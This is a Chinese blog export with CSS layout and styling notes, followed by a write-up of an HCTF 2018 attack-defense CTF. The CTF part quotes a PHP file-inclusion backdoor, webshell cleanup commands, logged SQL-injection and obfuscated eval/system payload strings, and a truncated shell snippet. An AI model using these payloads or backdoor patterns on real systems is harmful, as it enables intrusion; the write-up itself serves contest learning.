class=&quot;main&quot;&gt; &lt;div class=&quot;wrap&quot;&gt;main&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt; 使用相对定位先给三列的父容器设置一个左右200px的padding，将三列压扁，然后给左右列设一个相对定位padding空出来的位置填满。即可让主列元素全部显示出来。 12345678910111213141516171819202122232425262728293031.col-main&#123; float: left; width: 100%; background:red;&#125;.col-sub&#123; float: left; width: 190px; margin-left: -100%; background:green; position: relative; left: -200px;&#125;.col-extra&#123; float: left; width: 190px; margin-left: -190px; background: blue; position: relative; right:-200px;&#125;.demo&#123; padding: 0 200px;&#125;&lt;div class=&quot;demo&quot;&gt; &lt;div class=&quot;col-main&quot;&gt;我是主列&lt;/div&gt; &lt;div class=&quot;col-sub&quot;&gt;我是子列&lt;/div&gt; &lt;div class=&quot;col-extra&quot;&gt;我是附加列&lt;/div&gt;&lt;/div&gt; 三栏布局 上述说的双飞翼(margin负值法)布局 绝对定位法左右宽度固定，采用绝对定位，中间主体用margin撑开。不好用。 自身浮动法左右标签，分别左右浮动，主列标签放最后实现自适应。 123456789101112131415161718192021222324html,body&#123; height: 100%; margin: 0;&#125;.left&#123; width: 100px; height: 100%; float: left; background:rgb(223, 85, 21);&#125;.middle&#123; background:rgb(28, 113, 211); height: 100%; margin: 0 120px;&#125;.right&#123; width: 100px; height: 100%; float: right; background: rgb(27, 156, 81);&#125;&lt;div class=&quot;left&quot;&gt;left&lt;/div&gt;&lt;div class=&quot;right&quot;&gt;right&lt;/div&gt;&lt;div class=&quot;middle&quot;&gt;middle(这个一定要放最后)&lt;/div&gt;]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS-前端学习记录]]></title>
    <url>%2F2019%2F01%2F29%2FCSS-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[想个小组wiki写个炫酷的前端，这半个月来一直在不断的练习前端开发，分享一些自己学习过程的记录~ 选择器 标签选择器p{font-size: 12px} 类选择器.class{font-size: 12px}绑定标签的class属性，可以重复 ID选择器#id{font-size: 12px}绑定标签的id属性，不能重复 子选择器.food&gt;li{border:1px}选择food类中的li标签，只能选择直接后代(第一代后代) 包含后代选择器.first span{color:red}即选择first类里的span标签，所有后代都可以 通用选择器* {color: red;} 伪选择器a:hover{color:red;}即鼠标滑过时触发的选择器，这里使a标签里的文字变红 分组选择器h1,span{color: red}选住全部h1和span标签 相邻选择器div+p 选择紧着在&lt;div&gt;元素后的&lt;p&gt; 注意和包含后代选择器/子选择器的区别为，它们选择的是包含在其中的元素，而+号选择器选择的是同级别关系的 通用选择器A ~ B:匹配B元素，B是A之后兄弟节点中任意一个。 文本样式： 字体font-family: &quot;宋体&quot;;font-family:&quot;Microsoft Yahei&quot;; 字号font-size: 12px字体大小单位有： px：像素值，绝对单位 em：1em相当于当前元素的父元素的大小 rem: 1rem相对于根元素()的字体大小 所以一般我们将&lt;html&gt;元素的font-size设为一个固定的px值，之后的段落基于rem来变化即可。 3.颜色color: red 粗体大小font-weight: normal | bold | lighter | border normal: 普通 bold: 加粗 更细或更粗 字体样式font-style: normal | italic | oblique normal: 设置为普通字体(若存在斜体则关闭) italic: 设置斜体 文本装饰text-decoration:line-through参数：none 默认。定义标准的文本。underline 定义文本下的一条线。overline 定义文本上的一条线。line-through 定义穿过文本下的一条线。blink 定义闪烁的文本。inherit 规定应该从父元素继承 text-decoration 属性的值。 demo：同时添加上下划线1text-decoration: underline overline; 字体转换text-transform: none | uppercase | lowercase | capitalize | full-width none: 防止任何转型。 uppercase: 将所有文本转为大写。 lowercase: 将所有文本转为小写。 capitalize: 转换所有单词让其首字母大写。 full-width: 将所有字形转换成固定宽度的正方形，类似于等宽字体，允许对齐。拉丁字符以及亚洲语言字形（如中文，日文，韩文） 嵌入字体加载服务端的字体文件，让浏览器可以显示用户电脑没有的字体 1234@font-face &#123; font-family : 字体名称; src : 字体文件在服务器上的相对或绝对路径;&#125; 文本阴影text-shadow: X-Offset Y-Offset blur color;X-Offset：表示阴影的水平偏移距离，其值为正值时阴影向右偏移，反之向左偏移； Y-Offset：是指阴影的垂直偏移距离，如果其值是正值时，阴影向下偏移，反之向上偏移； Blur：是指阴影的模糊程度，其值不能是负值，如果值越大，阴影越模糊，反之阴影越清晰，如果不需要阴影模糊可以将Blur值设置为0； Color：是指阴影的颜色，其可以使用rgba色。demo: text-shadow: 2px 2px 0 red 文本对齐text-align: left | right | center | justify分别为：左对齐文本 | 右对齐 | 居中 | 使文本展开，使行宽相同 行距line-height: 1.5支持大多数单位，也可以无单位，作为乘数，乘以font-size。一般设置为盒子模型的height值，可以起到垂直居中作用。 单词和字母间距letter-spacing:word-spacing: 缩进text-indent:2em给段落开头缩进2em，即两个文字的空白 行间距line-height: 1.5em 字间距letter-spacing: 50px (段落)对齐text-align: center 缩写：12345678910111213body&#123; font-style:italic; font-variant:small-caps; font-weight:bold; font-size:12px; line-height:1.5em; font-family:&quot;宋体&quot;,sans-serif;&#125;缩写为：body&#123; font:italic small-caps bold 12px/1.5em &quot;宋体&quot;,sans-serif;&#125; textarea标签相关属性 控制元素大小可调整性：resize123456789101112/* Keyword values */resize: none; /*默认*/resize: both;resize: horizontal;resize: vertical;resize: block;resize: inline;/* Global values */resize: inherit;resize: initial;resize: unset; 背景 基本内容background 背景色: background-color: red 背景图像：background-image: url(https://img) 背景重复：background-repeat: no-repeat | repeat-x | repreat-y | repeat效果分别为，不重复 | 水平重复 | 垂直重复 | 都重复 背景位置：background-position: px | rems | % | center | left | right | top | bottom 渐变：background-imagebackground-image: linear-gradient(to bottom, yellow, orange 40%, yellow)使用渐变函数:linear-gradient()传入渐变方向(to bottom | to right | to bottom right等), 渐变色。 重复渐变background-image: repeating-linear-gradient(to right, yellow, orange 25px, yellow 50px);0-&gt;50%，50%-&gt;100%周期渐变 背景附着：background-attachment: scroll | fixed | local内容滚动时，背景显示的效果。demo:https://github.com/mdn/learning-area/tree/master/css/styling-boxes/backgrounds 简写：background: yellow linear-gradient(to bottom, orange, yellow) no-repeat left center scroll; 背景大小: background-sizebackground-size: auto | &lt;长度值&gt; | &lt;百分比&gt; | cover | contain auto：默认值，不改变背景图片的原始高度和宽度；&lt;长度值&gt;：成对出现如200px 50px，将背景图片宽高依次设置为前面两个值，当设置一个值时，将其作为图片宽度值来等比缩放； &lt;百分比&gt;：0％~100％之间的任何值，将背景图片宽高依次设置为所在元素宽高乘以前面百分比得出的数值，当设置一个值时同上； cover：顾名思义为覆盖，即将背景图片等比缩放以填满整个容器； contain：容纳，即将背景图片等比缩放至某一边紧贴容器边缘为止。 背景源：background-originbackground-origin: border-box | padding-box | content-box;参数分别表示背景图片是从边框，还是内边距（默认值），或者是内容区域开始显示。 背景剪切： background-clipbackground-clip ： border-box | padding-box | content-box | no-clip参数分别表示从边框、或内填充，或者内容区域向外裁剪背景。no-clip表示不裁切，和参数border-box显示同样的效果。backgroud-clip默认值为border-box。 如果要剪切成圆形，则写一个 border-radius,然后在这个盒子中赋一个背景图即可。 盒子模型块状模型都具备盒子模型的特征 盒子模型边框粗细：border-width: 2px样式：border-style:solid,常见的值有: dashed (虚线)|dotted(点线)|solid(实线)颜色：border-color: red 可以简写为：border: 2px solid red如果只想设置底边：border-bottom: 2px solid red，其他边同理：border-top | border-right | border-left 边框圆角border-radius:10px;border-radius: 5px 4px 3px 2px; /*四个半径值分别是左上角、右上角、右下角和左下角，顺时针 */ demo:半圆1234567div.circle&#123; height:50px width:100px; background:#9da; border-radius:50px 50px 0 0 ; &#125;&lt;div class=&quot;circle&quot;&gt;&lt;/div&gt; 边框阴影(box-shadow)box-shadow: X轴偏移量 Y轴偏移量 [阴影模糊半径] [阴影扩展半径] [阴影颜色] [投影方式]; 不同浏览器适配：123 -webkit-box-shadow:;-moz-box-shadow:;box-shadow:; 盒子模型宽和高几个关键参数： 宽：width 填充：padding 边框：border 边界：margin 同样也可以设置顶底左右的距离,如：padding-top等等,简写：top、right、bottom、left值相同：margin:10px 10px 10px 10px; =&gt;margin: 10pxtop和bottom，left和right相同:margin:10px 20px 10px 20px;=&gt;margin:10px 20px; 如果left和right相同：margin:10px 20px 30px 20px;可缩写为：margin:10px 20px 30px; 溢流:overflow: auto | hidden | visible auto: 溢出盒子的内容将被隐藏，出现滚动条 hidden: 溢出的内容隐藏 visible: 溢出的内容显示在盒子外边 轮廓：Outline 盒子模型：box-sizingbox-sizing: content-box | border-box | inherit设置成border-box后，即margin，padding这些不会再影响width和height的总长。 盒子元素类型转换转换为内联元素：display:inline转化为块状元素：display:block转化为内联块状元素：display: inline-block 还有一些其他的显示类型： display: table: 可以像处理table布局哪样处理非table元素。 display: flex：可以布置一些弹性等宽容器，或者垂直居中内容等 display: grid：css网格。 盒子宽和高的约束 demo: 父容器在最大和最小的限制内，它将填满整个视图，父小于1280px，布局保持1280px，小于480px，则滚动才能看到全部内容。1234width: 70%max-width: 1280px;min-width: 480px;margin: 0 auto; /*在父容器中上下边距为0，左右居中*/ demo2: 将图像/视频，限制在容器内部123display: block;margin: 0 auto;max-width: 100%; /*父容器缩小到小于图像宽度，图像会一起缩小*/ 样式列表 列表特定样式作用在&lt;ul&gt;和&lt;ol&gt;元素上： 列表项目符号的类型：list-style-type: upper-roman | none | square (大写的罗马字，或者方形符号,或者没有) 符号在列表项内还是外： list-style-position: inside | outside(默认) 项目符号自定义图片：list-style-image: url(star.svg) 简写：list-style: square url() inside; 管理列表计数 start：从1以外的数字开始计数demo: 从4开始计数 123456&lt;ol start=&quot;4&quot;&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;li&gt;6&lt;/li&gt; &lt;li&gt;7&lt;/li&gt;&lt;/ol&gt; reversed: 列表倒计数 1234&lt;ol start=&quot;4&quot; reversed&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;3&lt;/li&gt;&lt;/ol&gt; value: 设置列表项指定数值 1234&lt;ol&gt; &lt;li value=&quot;2&quot;&gt;2&lt;/li&gt; &lt;li value=&quot;10&quot;&gt;10&lt;/li&gt;&lt;/ol&gt; 链接 链接状态每一个状态都对应的伪类来应用样式 Link(未访问过的): 默认，可以使用:link来应用样式 Visited:已经被访问过的，同理可以用:Visited伪类来应用样式 Hover：鼠标停留在链接上 Focus：被选中(如通过tab移动到这个链接)时 Active：被激活的时候(被点击)。 使用的顺序是从上到下的，因为当链接被激活的时候是选中状态的。 链接中包含图标思路和之前的将列表的原点替换成图片思路一样，引入背景图标，将背景的位置设为100% 0右上角，设置背景的大小，然后将文字右填充padding-right:设成比背景大一点即可。 demo:123456a[href*=&quot;http&quot;]&#123; background: no-repeat url(&apos;https://mdn.mozillademos.org/files/12982/external-link-52.png&apos;) 100% 0; background-size: 1rem; padding-right:1.2rem; &#125; 浮动布局让两块状元素(默认换行)并排显示(浮动效果)：float:left | right一般应用于首字下沉，或者图片被文字环绕的情景，多列浮动布局demo:123456789101112131415161718192021body &#123; width: 90%; max-width: 900px; margin: 0 auto;&#125;div:nth-of-type(1) &#123; width: 36%; float: left;&#125;div:nth-of-type(2) &#123; width: 30%; float: left; margin-left: 4%;&#125;div:nth-of-type(3) &#123; width: 26%; float: right;&#125; 清除浮动clear: left | right | both清除左|右|全部浮动，一般出现在浮动元素下方的元素需要清除。 清除浮动的另一种方法设置元素溢出时处理方案：overflow: auto; 布局：定位 绝对定位(position: absolute)设置position: absolute后，然后使用left | right | top | bottom对于其最近的一个具有定位属性的父包含块进行绝对定位(没有则选择body元素，即浏览器窗口)demo: 12345div&#123; position: absolute; left:100px; top:200px;&#125; 相对定位(position: relative)同样设置好position: relative之后，使用left|right|top|bottom相对于原来位置移动 固定定位(position: fixed)设置position: fixed，使用left|right|top|bottom，效果和绝对定位类似，他是相对于屏幕固定的，不会随着浏览器滚动条变动，也不会因为窗口的放大或缩小而动态变化。 可以给导航栏用 Relative和Absolute组合使用相对其他元素进行定位。参照定位元素:position: relative相对定位元素:position: absolute之后即可以使用left、top等熟悉进行偏移了。 重叠：z-index设置图层位置，也就是谁在上谁在下 即以z轴作参考，数值大的在上层demo:z-index:-1 弹性盒子布局继css布局工具只有float和position以来，flex实现了一些它们难以实现的功能。 flex模型说明 主轴（main axis）是沿着 flex 元素放置的方向延伸的轴（比如页面上的横向的行、纵向的列）。该轴的开始和结束被称为 main start 和 main end。 交叉轴（cross axis）是垂直于 flex 元素放置方向的轴。该轴的开始和结束被称为 cross start 和 cross end。 设置了 display: flex 的父元素（在本例中是 ）被称之为 flex 容器（flex container）。 在 flex 容器中表现为柔性的盒子的元素被称之为 flex 项（flex item）（本例中是 元素 设置弹性盒子display: flex 设置展示方向flex-direction: row | row-reverse | column | column-reverse 默认为row，即排列成一行，加了reverse即元素顺序倒序。 换行flex-wrap: wrap | nowrap默认值为:nowrap，即不换行demo:元素溢出时换行设置换行：flex-wrap: wrap flex-flow缩写(上述两个参数) 12flex-direction: row;flex-wrap: wrap; -&gt;flex-flow: row wrap 动态尺寸flex: &lt;number&gt;; demo:flex弹性盒子中三个article盒子宽(高)度比例为1:2:3123456789article:nth-of-type(1)&#123; flex: 1;&#125;article:nth-of-type(2)&#123; flex: 2;&#125;article:nth-of-type(3)&#123; flex: 3; &#125; demo2：还可以指定最小值，每个盒子分配完100px后，接着按比例将剩余空间分配123456789article:nth-of-type(1)&#123; flex: 1 100px;&#125;article:nth-of-type(2)&#123; flex: 2 100px;&#125;article:nth-of-type(3)&#123; flex: 3 100px;&#125; 垂直对齐 控制flex在交叉轴(纵轴)的位置align-items: stretch | center | start | endstretch：默认值，在交叉轴方向拉伸，以填充父容器，如果父容器在交叉轴没有固定的高度，则和最长的flex项高度保持一致 demo:https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items align-self: flex-start | flex-end 可以覆盖align-items的效果 demo: 123 button:first-child &#123; align-self: flex-end;&#125; 水平对齐justify-content: center | start | end | flex-start | flex-end | space-between | space-around | space-evenly等等 flex-start：从行首起始位置开始排列 start： 从主轴开始排列 space-between: 均匀排列元素，首个元素放置于起点，末尾元素放置于终点 space-around： 均匀排列每个元素，每个元素周围分配相同的空间 space-evenly; 均匀排列每个元素，每个元素之间的间隔相等 全部参数：https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content flex项排序order: &lt;number&gt;;：数值越大的在越后面 demo:将第一个按钮放最后，后边的以此往前移动123button:first-child&#123; order: 1;&#125; flex 嵌套可以为flex项目的孩子设置display:flex使之表现为flexible box 缩写语法规则：https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex flex 缩写flex: 0 0 200px; 参数1：flex-grow，该值表示和其他flex盒子成的比例关系 参数2：flex-shrink, 默认宽度大于容器时的一个收缩规则，也是比例关系。 参数3：flex-basis, 有效宽度值，即基准值。 多列布局 文本的多列布局？ 多列布局： Columnscolumns：&lt;column-width&gt; || &lt;column-count&gt;，属性值列宽和列数。demo: 200px 两列1columns: 200px 2; 列宽： column-widthcolumn-width: auto | &lt;length&gt;，可以单独使用。 列数：column-countcolumn-count：auto | &lt;integer&gt; 列间距： column-gapcolumn-gap: normal || &lt;length&gt;，默认1em，也可以用px作单位 列边框样式：column-rule 1column-rule:&lt;column-rule-width&gt;|&lt;column-rule-style&gt;|&lt;column-rule-color&gt; 和border类似，设置列边框的宽/样式/颜色demo：column-rule: 2px dotted green; 跨列设置: column-spancolumn-span:all | none， all为跨越所有列 CSS3 opacity属性设置元素的不透明级别demo: 设置div元素为透明123div&#123; opacity: 0;&#125; 0x03 元素元素分类： 块状：默认为块级元素一个占一行(从新一行开始，后面的元素另起一行)。高、宽、行高、顶和底边距可设，默认占父容器100%。使用display:block可将非块状元素转化成块状。常见元素有： 1&lt;div&gt;、&lt;p&gt;、&lt;h1&gt;...&lt;h6&gt;、&lt;ol&gt;、&lt;ul&gt;、&lt;dl&gt;、&lt;table&gt;、&lt;address&gt;、&lt;blockquote&gt; 、&lt;form&gt; 内联：和其他元素在一行上，元素高、宽度及顶和底边距不可设置，元素宽度即其包含的内容的宽度，不可改变。可以使用display: inline将非内联元素转换为内联元素。常见元素： 1&lt;a&gt;、&lt;span&gt;、&lt;br&gt;、&lt;i&gt;、&lt;em&gt;、&lt;strong&gt;、&lt;label&gt;、&lt;q&gt;、&lt;var&gt;、&lt;cite&gt;、&lt;code&gt; 内联块状： 同时具备内联元素和块状的特点，和其他元素在一行，元素边距可设置。可以使用display: inline-block转换 1&lt;img&gt;、&lt;input&gt;]]></content>
      <categories>
        <category>Code</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HCTF 2018 AWD小记]]></title>
    <url>%2F2018%2F12%2F20%2FHCTF%202018%20AWD%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[反思跑了这么远去杭州，把小组的脸都给丢尽了…这里说几个我们吃到亏吧，第一次打awd，举办方的赛制和我们之前练习的情形不太一样。可能考虑到去线下的都是老赛棍，就没有照顾到我们这样的萌新，赛制说明都没有。 直到打到后来才知道，10分钟结算一轮flag，如果被攻击的服务被check宕机了，那么这个flag是无效的。即使你在这10分钟内提交flag，他给你显示flag提交成功，但最后结算的时候是不会算上分的。被check宕机的队伍会扣除60分给没有宕机的队伍每人加10分。我们当时想着提了一堆flag打得贼带感，结果能加上的分少的可怜，第一题除了天枢和蓝莲花的师傅偶尔是正常的一轮能涨上100多分，其他队伍全程宕机，所以防守和进攻同等重要。 其次就是check相关的，我们配网络连ssh浪费了很多时间，1l 0O分不清，导致我们一上线，我们机子里就被种了一堆马。然后我们拿不到最初始的源码，回滚到第一次备份都还是很多页面都是坏的， 最后web1被check宕了2天整的。然后修洞，不要想着给全站555就能防住被传马了，这次上传点也是一个check点，在后面会结合check流量进行详细分析。 再说说运维相关的，这次我们队我负责运维的，有个比较恼火的东西就是，我们上传的洞一直没修复，因为我一直就用的555去防的，导致我们运维的时候想改一点东西，就会加上写的权限，结果种上了一堆内存马。事后去问他们，题目通过散列根据ip生成随机文件名随机密码的不死马，有一个守护进程的马，还有不断复制的马。我当时运维的时候，web1还行，web2一上线找路由规则就摸了半天，他那个是.htaccess套.htaccess的，所以我给自己目录传一个运维shell，怎么都访问不到。其次就是菜刀连不上的，我拿着burp，一条条命令手动输： team用户chmod 777 -R ./upload,给与文件夹的写权限才能删里面的文件 www-data用户：killall -u www-data，清掉不死马进程 www-data：chmod 777 -R ./upload,将马权限修改 最后再rm -rf才能删掉但是这过程因为我们没修洞.. 在用team用户给写权限的时候，一堆马又飞进来了…在这上面浪费的时间挺多的，所以得提前准备好py菜刀，提前写好这几步操作。 这次比赛，菜刀是别想了，因为临近考试，webshell的利用脚本还有bug没调试完，所以我们就只能现写各种漏洞类型的利用程序，也就仅仅种个马，读个flag就没了。还有其他的套路都没玩的上。 check流量分析事后把waf记录的流量导出来整理分析了一番，这次举办方的check可谓是十足的严格，第一天全场web宕机。还有他们还会check是否使用通防。 从流量中可以看到，web1的check流程：注册-&gt;登录-&gt;上传图片-&gt;包含图片之所以还在数据中看到一堆乱七八糟的类似payload的东西，这肯定就是主办方check通防的方法了。 所以： 千万不要用555，宁可上一个.htaccess(虽然后面还是被蓝莲花的师傅rm/覆盖了) 不要想着banip了，checkbot的ip会变几次，更何况还会被举报，check到一次扣800分… 切完不要直接删功能点，文件包含这个点，看着就是一个后门&#39;&lt;?php include($_GET[&#39;img&#39;]); ?&gt;&#39;,结果谁知道这是个check点.. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748time: ip: 192.168.233.42POST /client/user/emmm_play.class.php?emmm_cms=reg&amp;flag=ZrMlDhzjtpiKdWQnPNVyBxvw%20&apos;%20or%20select%201,2,3,4,5,(select%200xazuLSJeROvTlnChqgXmBpFckHADoKfGsbdZMPItVwirjENWQUyxY),7,8,9,10,11,12Host: 192.168.233.40:5005Content-Length: 274Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveContent-Type: application/x-www-form-urlencodedpost-data: lang=cn&amp;COL_Useremail=wqtCeoznUp%40pDusboSjcE.com&amp;COL_Useranswer=KvcuIkTRwz&amp;COL_Userproblem=%E4%BD%A0%E8%87%AA%E5%B7%B2%E7%9A%84%E7%94%9F%E6%97%A5%EF%BC%9F&amp;source=0&amp;ip=127.0.0.1&amp;COL_Userpass2=123456&amp;COL_Userpass=123456&amp;introducer=&amp;Submit=%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8Ctime: ip: 192.168.233.42POST /client/user/emmm_play.class.php?emmm_cms=login&amp;flag=edruHEyhIcsMPivmpoWxlzNjVYCFgLwSaAGDbnkt%20&apos;%20&amp;&amp;%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,(select%200xeYKCTRrMpmofFqEsdNhnZlcXDiUVSbxgzHyGuQJtIBWjvLPwkaOA)Host: 192.168.233.40:5005Content-Length: 87Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveCookie: PHPSESSID=ol9nsqdpgkli34mu4kuebohcqkContent-Type: application/x-www-form-urlencodedpost-data: COL_Useremail=wqtCeoznUp%40pDusboSjcE.com&amp;COL_Userpass=123456&amp;Submit=%E7%99%BB%E5%BD%95time: ip: 192.168.233.42POST //client/user/emmm_play.class.php?emmm_cms=edit&amp;lang=cnHost: 192.168.233.40:5005Content-Length: 79075Accept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0Connection: keep-aliveCookie: PHPSESSID=ol9nsqdpgkli34mu4kuebohcqkContent-Type: multipart/form-data; boundary=ad7bceb5053a4b3ca22cd26f34b77a19time: ip: 192.168.233.42GET /client/user/index.php?img=../../skin/HcSLetgnrb.pngHost: 192.168.233.40:5005Connection: keep-aliveAccept-Encoding: gzip, deflateAccept: */*User-Agent: python-requests/2.7.0 CPython/2.7.15 Darwin/18.2.0 day2-web1:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151162018/12/16 02:32:10GET /check?cmd=sdhABbfUTgCuIWqSnvXRjYLM.move_file(AOFyfsqBgVeoTdKtMSICEjaGbRUHL.base64_decode(file_get_content(VMZthpbqiuzURmGCDEwFHyadSPrNeWxnQsYkKXcgJAjoTlBIOvfL).zGgOeoBqwVrIjayQLUWbDinvh).SFhuxlvKbWkUwMYE HTTP/1.1IP：192.168.22.243HOST：192.168.117.100:9009:9009USER_AGENT：COOKIE：REFERER：2018/12/16 02:37:02GET /check?cmd=MxyLYmfRiUWuqIFCVowJrOSATEgtHs &apos; &amp;&amp; select 1,2,3,4 HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：REFERER：2018/12/16 02:37:02GET /?cmd=YfLvGKAnQNebwqpPijUu &apos; or select 1,2,3,4,5,6,7,8,9,10,11,12,(select 0xyUpKDhLVwfBtFivxAbZqEjXCQdJYMaGlozIHPnuekOcNmsgWR),14,15,16,17,18,19,20,21,22,23,24,25 HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：REFERER：2018/12/16 02:37:02GET /users/register?cmd=irTekycoKIWSRCsfUqxBAgapl.substr(NhaVIUPfvOmuAjDgrsXJSKMixYyBZo.readdir(VnAGsifbEUZzjCw.move_file(DivqLWumQORGaTkJrC.readdir(base64_decode(fporTBYmQdAHxyuRXcIEnDFhGOkzMbLaWwNVetUvqjZPgClJKSsi).LEwjPvQxCKFOA).TEivOpdPRkrcouhzVKbeIaFUGH).OMVWBXdxNPGgAeLhS).pdrcXqohZFHW) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST /users/register?cmd=xRVrcDLSZMUPpbXjsBiOz &apos; union select 1,2,3,4,5,6,7,(select 0xXctOkvxodFyfGUuTDgblraRziAVSYKsQJHemEjZhwPWnLICNBMqp),9,10,11,12,13,14,15 HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST：username=ecCNkO&amp;confirm_password=kaljXLRHtU&amp;password=kaljXLRHtU2018/12/16 02:37:02GET /users/login HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：2018/12/16 02:37:02GET /users/login?cmd=bcjusDLfkrpMTwHeloSWZgqAd.file_put_contents(fhHiInvDELpKeJ.readdir(NFvnqgXMJHDE.glob(mtCEkDWycgzqnQVLaJPiZS.assert(ytvJChwoYe.fread(file_put_contents(GwLUrvORJmIPfYjVcMAuCtzBSThHZqXKb).hnrjIwBUuPexykfiWqc).HBSQthcujMYWDFPUkaAVgbivTsnN).KYsLfDbFHW).HGTMvLBkRgDmVKIso).RbIkdCSDoErKHYFqatGNjsWh) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST /users/login?cmd=GLpMuASfsPFWiXc.fread(CBMwgWxDbtcFPjAmNnXUVovKpieaLY.fread(mzuYHcTVvraCJhXR.dirname(lwzeLcmxMbTUoXgsABfYiJ.system(zHaZomhUABCrlWPykdqbIiD.eval(system(CxrWZSDBOknpjNweauXYdAgvoPzHQJRsbGcfVtElFMyIKThUqimL).jBqTLeChVQsDxmRtIZWbgki).yMqBZgcwzXjblrAYfEUICQThnD).GkovubFLynSrixIcpJgqR).OSyBnrvoWeXuIPNpEGsARZzJ).hsjweqlXxPrDROkMEibS) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST：username=ecCNkO&amp;password=kaljXLRHtU2018/12/16 02:37:02GET /users HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST /users/editprofit?cmd=YzOLfeHKbVjZyhcwonRXtJvTpSEIu.glob(maOUqAfuQhYM.file_get_content(KrzfMtSDuExbLX.move_file(readdir(gKUYOAHyNewQkRnoJfMXBmzpjTiaGdshcCEtFbrqxVWDIvSuPLlZ).TuPQJlhNjUYARoKIDEtCsaWcLBx).vikIXSEDftUW).fPzAivYRQEcIKCXrnNs) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST：username=QwLryC&amp;email=vESrMpul%40OlZDs2018/12/16 02:37:02GET /users HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST /users/editAvatar?cmd=XJqDYlazVZAxwtmNFnIyiQkGSvPcKOHoRfEWT &apos; and select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,(select 0xCUJzbVPHQLMpGZxaBDRSFdfhgcWEkryqiswlvjnTutmIAYKNXeoO),30,31,32,33,34,35 HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER：POST：POST /users?cmd=OYhzfowNAdGcvpRWsUbCXqIn.dirname(ZxtIKuPJprHCifgvGLQDmTeWjEnRsd.assert(qAxgrvhSiK.move_file(UTpIhfOkulKaxSoQjzwLmHZeYtr.substr(JimRENYeHZ.dirname(assert(fldrzeIkncKqORGVTiEtuFhoNwpJAPxSyUBDCLmZvXHWQMagsjYb).mzLflHhTvrCGyjPSnNU).PuvwmptyQRWn).UcrCmvYgKjAFiXEVuIeGw).wBJClAQUGr).puUhczOWfMJQSxIyqXLEGAwnNCKDRZ) HTTP/1.1IP：192.168.50.150HOST：192.168.117.100:9009:9009USER_AGENT：python-requests/2.18.4COOKIE：PHPSESSID=REFERER： 沟通虽然不限制外网，但是网线和wifi切换起来还是很麻烦而且时效性也是个问题。我们在队内用飞鸽传书这个内网聊天程序来解决的。也尝试了双网卡，但是还是有一点小问题。 师傅们的shell 默小西师傅的shell：moxiaoxi ip:192.168.13.134 他的shell同时还进行了内容检测。其实也可以破，我们清马的时候，记一下文件名，然后清完之后，给他上一个同名文件记录流量，就知道他密码了，然后搭一波顺风车~ 123456789101112131415161718192021222324252627282930system(&apos;/bin/echo mo123;/bin/echo 